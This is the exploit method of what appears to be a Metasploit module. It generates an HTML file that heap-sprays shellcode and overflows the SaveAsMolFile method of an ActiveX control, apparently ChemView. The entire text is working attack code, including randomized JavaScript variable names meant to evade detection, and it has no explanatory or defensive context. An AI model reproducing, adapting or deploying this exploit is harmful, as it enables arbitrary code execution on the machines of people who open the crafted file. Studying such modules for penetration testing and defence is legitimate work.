def exploit
 
        # Encode the shellcode
        shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
 
        # Setup exploit buffers
        nops      = Rex::Text.to_unescape([target.ret].pack('V'))
        ret       = Rex::Text.uri_encode([target.ret].pack('L'))
        blocksize = 0x40000
        fillto    = 300
        offset    = target['Offset']
 
        # Randomize the javascript variable names
        chemview     = rand_text_alpha(rand(100) + 1)
        j_shellcode  = rand_text_alpha(rand(100) + 1)
        j_nops       = rand_text_alpha(rand(100) + 1)
        j_ret        = rand_text_alpha(rand(100) + 1)
        j_headersize = rand_text_alpha(rand(100) + 1)
        j_slackspace = rand_text_alpha(rand(100) + 1)
        j_fillblock  = rand_text_alpha(rand(100) + 1)
        j_block      = rand_text_alpha(rand(100) + 1)
        j_memory     = rand_text_alpha(rand(100) + 1)
        j_counter    = rand_text_alpha(rand(30) + 2)
 
 
        html = %Q|<html>
<object classid='clsid:C372350A-1D5A-44DC-A759-767FC553D96C' id='#{chemview}'></object>
<script>
#{j_shellcode}=unescape('#{shellcode}');
#{j_nops}=unescape('#{nops}');
#{j_headersize}=20;
#{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;
while(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops};
#{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace});
#{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace});
while(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock};
#{j_memory}=new Array();
for(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};
 
var #{j_ret}='';
for(#{j_counter}=0;#{j_counter}<=#{offset};#{j_counter}++)#{j_ret}+=unescape('#{ret}');
#{chemview}.SaveAsMolFile(#{j_ret});
</script>
</html>|
 
        print_status("Creating '#{datastore['FILENAME']}' file ...")
 
        file_create(html)
    end
